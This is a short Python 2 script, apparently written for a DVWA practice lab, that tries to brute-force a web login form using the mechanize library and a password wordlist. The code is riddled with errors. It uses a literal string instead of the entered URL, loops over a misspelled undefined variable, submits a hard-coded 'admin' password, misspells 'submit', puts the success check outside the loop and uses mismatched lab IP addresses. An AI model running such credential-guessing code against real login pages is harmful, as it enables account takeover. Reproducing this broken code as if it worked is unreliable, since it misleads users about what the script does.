import mechanize
b = mechanize.Browser()
wordlist = "wordlist.txt"
print "Sample of url http://192.168.56.118/dvwa/login.php"
url_name = raw_input("Enter url >> | ")
url = "url_name"
try:
#modify for the wordlist location!!
	wordlist = open(wordlist, "r")
except:
	print "\ Worldlist Not Found!"
	quit()
for password in worldist:

	response = b.open(url)
	print "Here just form name if not give use nr=0. "
	nas = raw_input("Enter the FORM NAME")
	b.select_form(nas)

#view source page and  see the userinput and password field for their name"
#for instance username and password is written as default lol.
	b.form['username'] = 'admin'
	b.form['password'] = 'admin'

	print "What kind of request GET POST "
	print "Everything thing should be in capital"
	methods= raw_input("Enter type of Request")
	b.method = "methods"
	response = b.sumbit()

#this  part check if your password correct then response will be equal will the login page
#you can change this too
if  response.geturl() == "http://192.168.56.103/dvwa/index.php":
	print "Passowrd Found: " + password.strip() 
